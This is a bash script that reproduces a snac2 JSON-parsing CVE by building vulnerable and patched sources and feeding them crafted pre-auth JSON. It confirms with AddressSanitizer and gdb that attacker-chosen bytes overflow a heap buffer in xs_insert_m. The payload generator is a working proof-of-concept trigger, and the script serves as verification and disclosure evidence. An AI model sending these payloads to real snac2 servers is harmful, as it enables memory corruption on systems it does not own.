#!/usr/bin/env bash
# Replay the snac2 CVE-2026-112021 harness from clean pinned sources.
set -u
cd "$(dirname "$0")/.." || exit 1
ROOT=$PWD
CC=${CC:-cc}

die() { printf 'FAIL: %s\n' "$*" >&2; exit 1; }

for t in vuln fixed; do
    if [ ! -f "src/$t/xs.h" ]; then
        tag=2.92
        [ "$t" = fixed ] && tag=2.93
        mkdir -p "src/$t" || die "mkdir src/$t"
        tar xzf "pins/snac-$tag.tar.gz" -C "src/$t" --strip-components=1 || die "extract $t"
    fi
done
[ -f pins/snac-2.92.tar.gz ] || die "missing pins/snac-2.92.tar.gz"
[ -f pins/snac-2.93.tar.gz ] || die "missing pins/snac-2.93.tar.gz"

mkdir -p out evidence harness/out-vuln-asan harness/out-fixed-asan \
         harness/out-vuln-plain harness/out-fixed-plain

# Payloads: the exact pre-auth JSON bytes, with the post-NUL chars chosen.
python3 - <<'PY'
for marker, name in ((b'A', '41'), (b'Z', '5a')):
    data = b'["", "dummy\\u0000' + marker * 80 + b'", ""]'
    open('out/poc-%s.json' % name, 'wb').write(data)
PY

CFLAGS='-g -O0 -fno-omit-frame-pointer'
for t in vuln fixed; do
    $CC $CFLAGS -fsanitize=address -I"src/$t" harness/parse_json.c \
        -o "harness/parse-$t-asan" || die "build $t asan"
    $CC $CFLAGS -I"src/$t" harness/parse_json.c \
        -o "harness/parse-$t-plain" || die "build $t plain"
done

# ASan: vulnerable faults, fixed is clean.
for t in vuln fixed; do
    for m in 41 5a; do
        ASAN_OPTIONS=detect_leaks=0 "harness/parse-$t-asan" "out/poc-$m.json" \
            > "harness/out-$t-asan/$m.log" 2>&1
        rc=$?
        if [ "$t" = vuln ]; then
            [ "$rc" -ne 0 ] || die "vuln ASan rc=$rc for $m"
            grep -q 'heap-buffer-overflow' "harness/out-$t-asan/$m.log" || die "no ASan report $m"
            grep -q 'WRITE of size 1' "harness/out-$t-asan/$m.log" || die "no WRITE-1 $m"
            grep -q 'xs_insert_m' "harness/out-$t-asan/$m.log" || die "no xs_insert_m frame $m"
        else
            [ "$rc" -eq 0 ] || die "fixed ASan rc=$rc for $m"
            ! grep -q 'AddressSanitizer' "harness/out-$t-asan/$m.log" || die "fixed ASan report $m"
        fi
    done
done

# gdb readback on the plain builds: chosen bytes past the usable allocation.
for t in vuln fixed; do
    for m in 41 5a; do
        sed "s|ARG_PAYLOAD|$ROOT/out/poc-$m.json|" harness/readback.gdb \
            > "out/readback-$t-$m.gdb"
        gdb -q -batch -x "out/readback-$t-$m.gdb" "harness/parse-$t-plain" \
            > "harness/out-$t-plain/$m.log" 2>&1 || die "gdb $t $m"
    done
done

python3 - <<'PY'
import re, sys
def readback(p):
    out = []
    for line in open(p):
        m = re.search(r'INSERT offset=(\d+) usable=(\d+) byte=0x([0-9a-f]{2})', line)
        if m:
            out.append((int(m.group(1)), int(m.group(2)), m.group(3)))
    return out
for marker in ('41', '5a'):
    v = readback('harness/out-vuln-plain/%s.log' % marker)
    f = readback('harness/out-fixed-plain/%s.log' % marker)
    v_oob = [x for x in v if x[0] >= x[1]]
    f_oob = [x for x in f if x[0] >= x[1]]
    if not v_oob:
        sys.exit('FAIL: no vulnerable OOB writes for %s' % marker)
    if any(x[2] != marker for x in v_oob):
        sys.exit('FAIL: vulnerable OOB byte is not the chosen marker %s' % marker)
    if f_oob:
        sys.exit('FAIL: fixed build has OOB writes for %s: %r' % (marker, f_oob[:3]))
    print('marker=%s vuln_oob_writes=%d first=(offset=%d,usable=%d,byte=0x%s) last_offset=%d '
          'fixed_oob_writes=%d' % (marker, len(v_oob), v_oob[0][0], v_oob[0][1],
                                   v_oob[0][2], v_oob[-1][0], len(f_oob)))
PY

# Normalize volatile fields (PIDs, addresses, paths) for byte-identical replay.
python3 - <<'PY'
import re, glob, os
for p in glob.glob('harness/out-*-asan/*.log') + glob.glob('harness/out-*-plain/*.log'):
    s = open(p, errors='replace').read()
    s = re.sub(r'==\d+==', '==PID==', s)
    s = re.sub(r'\(process \d+\)', '(process PID)', s)
    s = re.sub(r'0x[0-9a-fA-F]+', '0xADDR', s)
    s = re.sub(r'\+0x[0-9a-fA-F]+', '+0xOFF', s)
    s = re.sub(r'\s*\(BuildId: [^)]*\)', '', s)
    s = re.sub(r'/home/[^ ]+/lab/frontier/snac2shell', 'LAB', s)
    s = re.sub(r'\.\./\.\./\.\./\.\./src/libsanitizer', 'SANITIZER_SRC', s)
    open('evidence/norm-' + os.path.basename(os.path.dirname(p)) + '-' + os.path.basename(p), 'w').write(s)
PY
( cd evidence && sha256sum norm-* > ../EVIDENCE_HASHES.txt )
( cd pins && sha256sum * > ../PIN_HASHES.txt )
printf 'OK: replay complete\n'
